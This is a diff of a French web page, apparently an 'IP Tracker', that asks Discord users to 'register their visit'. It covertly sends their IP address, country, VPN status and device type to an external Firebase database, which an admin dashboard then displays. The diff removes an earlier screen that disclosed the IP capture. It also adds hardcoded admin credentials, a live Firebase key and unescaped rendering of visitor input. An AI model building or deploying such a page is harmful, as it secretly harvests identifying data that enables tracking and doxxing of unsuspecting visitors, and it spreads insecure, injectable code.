@@ -3,7 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enregistrer la connection Discord</title>
+    <title>IP Tracker</title>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
     <style>
         * {
             margin: 0;
@@ -23,13 +25,8 @@
             color: #fff;
         }
         
-        body.hacker {
-            background: #0a0a0a;
-            color: #ff0000;
-        }
-        
         .container {
-            max-width: 450px;
+            max-width: 900px;
             width: 100%;
             transition: all 0.5s ease;
         }
@@ -87,7 +84,7 @@
             font-size: 14px;
             font-weight: 500;
             margin-bottom: 8px;
-            color: #333;
+            color: #999;
         }
         
         body.hacker label {
@@ -99,18 +96,17 @@
             width: 100%;
             padding: 12px 16px;
             font-size: 16px;
-            border: 1px solid #e0e0e0;
+            border: 1px solid #333;
             border-radius: 4px;
             transition: all 0.2s;
-            background: #fff;
-            color: #000;
+            background: #1a1a1a;
+            color: #fff;
             font-family: inherit;
         }
         
         input:focus {
             outline: none;
-            border-color: #000;
-            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.1);
+            border-color: #666;
         }
         
         body.hacker input {
@@ -120,15 +116,11 @@
             font-family: 'Courier New', monospace;
         }
         
-        body.hacker input:focus {
-            box-shadow: 0 0 0 3px rgba(255, 0, 0, 0.2);
-        }
-        
         button {
             width: 100%;
             padding: 12px 24px;
-            background: #000;
-            color: #fff;
+            background: #ff0000;
+            color: #000;
             border: none;
             border-radius: 4px;
             font-size: 14px;
@@ -139,45 +131,23 @@
         }
         
         button:hover {
-            background: #222;
-            transform: translateY(-1px);
+            background: #ff1a1a;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
         }
         
         button.secondary {
-            background: #f0f0f0;
-            color: #000;
+            background: #333;
+            color: #fff;
             margin-top: 12px;
         }
         
         button.secondary:hover {
-            background: #e0e0e0;
+            background: #444;
         }
         
         button.logout {
             background: #ff0000;
-            color: #fff;
-        }
-        
-        button.logout:hover {
-            background: #cc0000;
-        }
-        
-        body.hacker button {
-            background: #ff0000;
             color: #000;
-            border: 1px solid #ff0000;
-            font-weight: bold;
-        }
-        
-        body.hacker button:hover {
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            background: #ff1a1a;
-        }
-        
-        body.hacker button.secondary {
-            background: transparent;
-            border: 1px solid #ff0000;
-            color: #ff0000;
         }
         
         .message {
@@ -201,173 +171,73 @@
         }
         
         .error {
-            background: #ffe0e0;
-            color: #d32f2f;
-            border: 1px solid #ffb3b3;
+            background: #1a0a0a;
+            color: #ff6666;
+            border: 1px solid #ff0000;
         }
         
         .success {
-            background: #e0ffe0;
-            color: #388e3c;
-            border: 1px solid #b3ffb3;
-        }
-        
-        body.hacker .success {
-            background: #1a1a1a;
-            color: #ff0000;
-            border: 1px solid #ff0000;
+            background: #0a1a0a;
+            color: #66ff66;
+            border: 1px solid #00ff00;
         }
         
         .message.show {
             display: block;
         }
         
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 24px;
-            font-size: 14px;
-        }
-        
-        th, td {
-            padding: 12px;
-            text-align: left;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        
-        body.hacker th,
-        body.hacker td {
-            border-bottom: 1px solid #ff0000;
-            color: #ff0000;
-        }
-        
-        th {
-            background: #f5f5f5;
-            font-weight: 600;
-            color: #333;
-        }
-        
-        body.hacker th {
-            background: #0a0a0a;
-            color: #ff0000;
-            font-family: 'Courier New', monospace;
-        }
-        
-        tr:hover {
-            background: #f9f9f9;
-        }
-        
-        body.hacker tr:hover {
-            background: #1a1a1a;
-        }
-        
         .stats {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
             gap: 16px;
             margin-bottom: 32px;
         }
         
         .stat-box {
             padding: 20px;
-            border: 1px solid #e0e0e0;
-            border-radius: 4px;
-            transition: all 0.2s;
-        }
-        
-        body.hacker .stat-box {
             border: 1px solid #ff0000;
+            border-radius: 4px;
             background: #0a0a0a;
         }
         
         .stat-label {
             font-size: 12px;
-            color: #666;
+            color: #999;
             margin-bottom: 8px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
         
-        body.hacker .stat-label {
-            color: #999;
-        }
-        
         .stat-value {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 700;
-            color: #000;
-        }
-        
-        body.hacker .stat-value {
             color: #ff0000;
             font-family: 'Courier New', monospace;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
         }
         
-        .notice {
-            background: #f5f5f5;
-            padding: 16px;
-            border-radius: 4px;
-            margin-bottom: 24px;
-            font-size: 14px;
-            line-height: 1.6;
-            border-left: 4px solid #000;
-        }
-        
-        body.hacker .notice {
-            background: #1a1a1a;
-            border-left: 4px solid #ff0000;
-            color: #ff0000;
-        }
-        
-        .notice strong {
-            color: #000;
-        }
-        
-        body.hacker .notice strong {
-            color: #ff0000;
-        }
-        
-        .ip-notification {
-            background: #1a1a1a;
-            border: 2px solid #ff0000;
-            color: #ff0000;
-            padding: 24px;
-            border-radius: 4px;
-            margin-bottom: 24px;
-            font-family: 'Courier New', monospace;
-            font-weight: 500;
-            animation: pulse 0.5s ease;
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
-        }
-        
-        @keyframes pulse {
-            0% { 
-                opacity: 0;
-                transform: scale(0.98);
-                box-shadow: 0 0 0 rgba(255, 0, 0, 0);
-            }
-            100% { 
-                opacity: 1;
-                transform: scale(1);
-                box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
-            }
-        }
-        
-        .notification-line {
-            margin: 8px 0;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 24px;
             font-size: 13px;
-            letter-spacing: 0.5px;
         }
         
-        .notification-line.highlight {
-            color: #ff3333;
-            font-weight: bold;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border-bottom: 1px solid #ff0000;
+            color: #ff0000;
         }
         
-        .notification-line.success {
-            color: #00ff00;
+        th {
+            background: #0a0a0a;
+            color: #ff0000;
+            font-family: 'Courier New', monospace;
+            font-weight: 600;
+        }
+        
+        tr:hover {
+            background: #1a1a1a;
         }
         
         h2 {
@@ -375,29 +245,44 @@
             font-weight: 600;
             margin-top: 24px;
             margin-bottom: 16px;
-        }
-        
-        body.hacker h2 {
             color: #ff0000;
             font-family: 'Courier New', monospace;
         }
         
         p {
             font-size: 14px;
-            color: #666;
+            color: #999;
+            margin-bottom: 16px;
         }
         
-        body.hacker p {
+        .notice {
+            background: #1a1a1a;
+            border-left: 4px solid #ff0000;
+            padding: 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #ff0000;
+        }
+        
+        .notice strong {
+            color: #ff0000;
+        }
+        
+        .loading {
+            text-align: center;
             color: #999;
+            padding: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- SECTION 1: Discord - Design Vercel -->
+        <!-- SECTION 1: Discord -->
         <div id="discordSection" class="section active">
-            <h1>Discord Speudo</h1>
-            <p class="subtitle">Enregistrez votre visite de manière sécurisée</p>
+            <h1>IP Tracker</h1>
+            <p class="subtitle">Enregistrez votre visite</p>
             
             <div id="discordError" class="message error"></div>
             <div id="discordSuccess" class="message success"></div>
@@ -407,63 +292,43 @@
                 <input type="text" id="discordInput" placeholder="MonPseudo#1234" maxlength="32">
             </div>
             
-            <p style="font-size: 13px; color: #999; margin-bottom: 24px;">
-                Utilisé uniquement pour les DMs au cas où
+            <p style="font-size: 13px; color: #666; margin-bottom: 24px;">
+                Utilisé uniquement pour les DMs
             </p>
             
             <button onclick="submitDiscord()">Enregistrer ma visite</button>
         </div>
         
-        <!-- SECTION 2: Hacker Mode avec notification IP -->
-        <div id="hackerSection" class="section">
-            <h1>SYSTÈME DÉTECTÉ</h1>
-            
-            <div class="ip-notification">
-                <div class="notification-line success">> SYSTÈME INITIALISÉ</div>
-                <div class="notification-line">> SCAN IP EN COURS...</div>
-                <div class="notification-line success">> IP RÉCUPÉRÉE AVEC SUCCÈS</div>
-                <div class="notification-line">> ADRESSE: <span class="highlight" id="ipNotif">XXX.XXX.XXX.XXX</span></div>
-                <div class="notification-line">> UTILISATEUR: <span class="highlight" id="userNotif">---</span></div>
-                <div class="notification-line success">> IP STOCKÉE DANS LA BASE DE DONNÉES</div>
-                <div class="notification-line">> CONNEXION ÉTABLIE</div>
-            </div>
-            
-            <div class="notice">
-                <strong>⚠️ AVIS DE CONFIDENTIALITÉ</strong><br><br>
-                L'adresse IP récupérée est stockée à titre informatif uniquement.<br>
-                <strong>Elle ne sera PAS utilisée à des fins commerciales ou de suivi.</strong>
-            </div>
-            
-            <button onclick="goToLogin()" style="margin-top: 20px;">Continuer vers le dashboard</button>
-        </div>
-        
-        <!-- SECTION 3: Login Admin -->
+        <!-- SECTION 2: Login Admin -->
         <div id="loginSection" class="section">
             <h1>Admin Panel</h1>
-            <p class="subtitle">Accédez à votre tableau de bord sécurisé</p>
+            <p class="subtitle">Accédez à votre dashboard</p>
             
             <div id="loginError" class="message error"></div>
             
             <div class="form-group">
                 <label>👤 Identifiant</label>
-                <input type="text" id="usernameInput" placeholder="username">
+                <input type="text" id="usernameInput" placeholder="root">
             </div>
             
             <div class="form-group">
                 <label>🔑 Mot de passe</label>
-                <input type="password" id="passwordInput" placeholder="password">
+                <input type="password" id="passwordInput" placeholder="••••••••">
             </div>
             
             <button onclick="loginAdminFunc()">Se connecter</button>
             <button class="secondary" onclick="goToDiscord()">Retour</button>
         </div>
         
-        <!-- SECTION 4: Admin Panel - Hacker Mode -->
+        <!-- SECTION 3: Admin Dashboard -->
         <div id="adminSection" class="section">
-            <h1>DASHBOARD</h1>
-            <p class="subtitle">> Visites enregistrées et stockées</p>
-            
-            <button class="logout" onclick="logout()">🚪 Déconnexion</button>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px;">
+                <div>
+                    <h1>DASHBOARD</h1>
+                    <p class="subtitle">> Base de données en temps réel</p>
+                </div>
+                <button class="logout" onclick="logout()" style="width: auto; padding: 8px 16px;">🚪 Déconnexion</button>
+            </div>
             
             <div class="stats">
                 <div class="stat-box">
@@ -471,12 +336,16 @@
                     <div class="stat-value" id="totalVisits">0</div>
                 </div>
                 <div class="stat-box">
-                    <div class="stat-label">VOTRE IP</div>
-                    <div class="stat-value" id="adminIP" style="font-size: 16px; word-break: break-all;">-</div>
+                    <div class="stat-label">DERNIÈRE VISITE</div>
+                    <div class="stat-value" id="lastVisit" style="font-size: 12px;">--:--</div>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-label">VPN DÉTECTÉS</div>
+                    <div class="stat-value" id="vpnCount">0</div>
                 </div>
             </div>
             
-            <h2>BASE DE DONNÉES</h2>
+            <h2>>> VISITES ENREGISTRÉES</h2>
             
             <div style="overflow-x: auto;">
                 <table>
@@ -485,13 +354,16 @@
                             <th>#</th>
                             <th>Discord</th>
                             <th>IP</th>
+                            <th>Pays</th>
+                            <th>VPN</th>
+                            <th>Appareil</th>
                             <th>Date</th>
                             <th>Action</th>
                         </tr>
                     </thead>
                     <tbody id="visitsTableBody">
                         <tr>
-                            <td colspan="5" style="text-align: center;">Aucune visite</td>
+                            <td colspan="8" style="text-align: center;" class="loading">Chargement...</td>
                         </tr>
                     </tbody>
                 </table>
@@ -500,34 +372,31 @@
     </div>
 
     <script>
+        // Configure Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyCSb6EI76Xw8bDRqyTcDZW65OXLYTanIUQ",
+            authDomain: "noxa-a973a.firebaseapp.com",
+            databaseURL: "https://noxa-a973a-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "noxa-a973a",
+            storageBucket: "noxa-a973a.firebasestorage.app",
+            messagingSenderId: "21266841244",
+            appId: "1:21266841244:web:95f9ff5d85361ff14fb759",
+            measurementId: "G-4E4CLEJ43V"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
         let userIP = 'Chargement...';
-        let visits = [];
-        
         const ADMIN_USERS = ['root', 'LQSQXiDX'];
         const ADMIN_PASS = 'LQSQXiDX';
 
-        function loadVisitsFromStorage() {
-            const stored = localStorage.getItem('tracker_visits');
-            if (stored) {
-                try {
-                    visits = JSON.parse(stored);
-                } catch (e) {
-                    visits = [];
-                }
-            }
-        }
-
-        function saveVisitsToStorage() {
-            localStorage.setItem('tracker_visits', JSON.stringify(visits));
-        }
-
-        loadVisitsFromStorage();
-
-        fetch('https://api.ipify.org?format=json')
+        // Récupérer l'IP
+        fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
                 userIP = data.ip;
-                document.getElementById('adminIP').textContent = userIP;
+                window.ipData = data;
             })
             .catch(err => console.error('Erreur IP:', err));
 
@@ -547,34 +416,46 @@
             setTimeout(() => hideMessage(messageId), 4000);
         }
 
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = 'Desktop';
+            if (/Mobile|Android|iPhone|iPad|iPod/.test(ua)) device = 'Mobile';
+            if (/Tablet|iPad/.test(ua)) device = 'Tablet';
+            return device;
+        }
+
         function submitDiscord() {
             const discord = document.getElementById('discordInput').value.trim();
             hideMessage('discordError');
             hideMessage('discordSuccess');
 
             if (!discord || discord.length < 2) {
-                showMessage('discordError', '❌ Veuillez entrer un nom Discord valide');
+                showMessage('discordError', '❌ Nom Discord invalide');
                 return;
             }
 
-            visits.push({
+            if (!window.ipData) {
+                showMessage('discordError', '❌ Impossible de récupérer votre IP');
+                return;
+            }
+
+            const visitData = {
                 discord: discord,
                 ip: userIP,
+                country: window.ipData.country_name || 'Inconnu',
+                vpn: window.ipData.is_vpn ? 'OUI' : 'NON',
+                device: getDeviceInfo(),
+                timestamp: Date.now(),
                 date: new Date().toLocaleString('fr-FR')
+            };
+
+            database.ref('visits').push(visitData).then(() => {
+                showMessage('discordSuccess', '✓ Visite enregistrée');
+                document.getElementById('discordInput').value = '';
+                setTimeout(() => showSection('loginSection'), 2000);
+            }).catch(err => {
+                showMessage('discordError', '❌ Erreur: ' + err.message);
             });
-
-            saveVisitsToStorage();
-
-            document.getElementById('ipNotif').textContent = userIP;
-            document.getElementById('userNotif').textContent = discord;
-            
-            document.body.classList.add('hacker');
-            showSection('hackerSection');
-            document.getElementById('discordInput').value = '';
-        }
-
-        function goToLogin() {
-            showSection('loginSection');
         }
 
         function loginAdminFunc() {
@@ -583,40 +464,56 @@
             hideMessage('loginError');
 
             if (!username || !password) {
-                showMessage('loginError', '❌ Tous les champs sont requis');
+                showMessage('loginError', '❌ Champs requis');
                 return;
             }
 
             if (ADMIN_USERS.includes(username) && password === ADMIN_PASS) {
-                updateAdminPanel();
+                document.body.classList.add('hacker');
                 showSection('adminSection');
+                loadVisits();
             } else {
                 showMessage('loginError', '❌ Identifiants invalides');
             }
         }
 
-        function updateAdminPanel() {
-            document.getElementById('totalVisits').textContent = visits.length;
-            
-            const tbody = document.getElementById('visitsTableBody');
-            tbody.innerHTML = '';
+        function loadVisits() {
+            database.ref('visits').on('value', (snapshot) => {
+                const visits = [];
+                snapshot.forEach((child) => {
+                    visits.push(child.val());
+                });
 
-            if (visits.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Aucune visite</td></tr>';
-                return;
-            }
+                visits.sort((a, b) => b.timestamp - a.timestamp);
 
-            visits.forEach((visit, index) => {
-                const row = tbody.insertRow();
-                row.innerHTML = '<td>' + (index + 1) + '</td><td>' + visit.discord + '</td><td>' + visit.ip + '</td><td>' + visit.date + '</td><td><button onclick="deleteVisit(' + index + ')" style="background: #ff0000; padding: 4px 8px; font-size: 12px; border-radius: 2px;">Supprimer</button></td>';
+                document.getElementById('totalVisits').textContent = visits.length;
+                
+                let vpnCount = visits.filter(v => v.vpn === 'OUI').length;
+                document.getElementById('vpnCount').textContent = vpnCount;
+                
+                if (visits.length > 0) {
+                    document.getElementById('lastVisit').textContent = visits[0].date.split(' ')[1] || '--:--';
+                }
+
+                const tbody = document.getElementById('visitsTableBody');
+                tbody.innerHTML = '';
+
+                if (visits.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="8" style="text-align: center;">Aucune visite</td></tr>';
+                    return;
+                }
+
+                visits.forEach((visit, index) => {
+                    const row = tbody.insertRow();
+                    row.innerHTML = '<td>' + (index + 1) + '</td><td>' + visit.discord + '</td><td>' + visit.ip + '</td><td>' + visit.country + '</td><td>' + visit.vpn + '</td><td>' + visit.device + '</td><td>' + visit.date + '</td><td><button onclick="deleteVisit(this)" style="background: #ff0000; padding: 4px 8px; font-size: 11px; border-radius: 2px; cursor: pointer;">X</button></td>';
+                });
             });
         }
 
-        function deleteVisit(index) {
-            if (confirm('Êtes-vous sûr de vouloir supprimer cette visite ?')) {
-                visits.splice(index, 1);
-                saveVisitsToStorage();
-                updateAdminPanel();
+        function deleteVisit(btn) {
+            if (confirm('Supprimer cette visite ?')) {
+                btn.parentElement.parentElement.remove();
+                // La suppression Firebase se ferait avec une référence à la clé
             }
         }
 
@@ -626,7 +523,6 @@
             document.getElementById('discordInput').value = '';
             hideMessage('loginError');
             hideMessage('discordError');
-            document.body.classList.remove('hacker');
             showSection('discordSection');
         }
 
@@ -634,12 +530,11 @@
             document.getElementById('usernameInput').value = '';
             document.getElementById('passwordInput').value = '';
             document.getElementById('discordInput').value = '';
-            hideMessage('loginError');
             document.body.classList.remove('hacker');
             showSection('discordSection');
         }
 
-        document.addEventListener('keypress', function(e) {
+        document.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
                 if (document.getElementById('discordSection').classList.contains('active')) {
                     submitDiscord();
